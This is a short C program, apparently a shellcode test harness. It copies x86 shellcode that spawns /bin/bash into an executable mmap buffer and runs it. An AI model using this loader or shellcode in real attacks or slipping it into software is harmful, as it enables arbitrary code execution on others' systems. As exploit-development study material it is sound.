#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>

char shellcode[] = \
"\x31\xc0\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void main()
{
	printf("[*] Creating executable buffer...\n");
	char *buf;
	int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	buf = mmap(0, sizeof(shellcode), prot, flags, -1, 0);

	printf("[*] Copying shellcode into buffer (%d bytes)...\n", strlen(shellcode));
	memcpy(buf, shellcode, sizeof(shellcode));

	printf("[*] Running shellcode...\n");
    ((void (*)(void))buf)();    
}

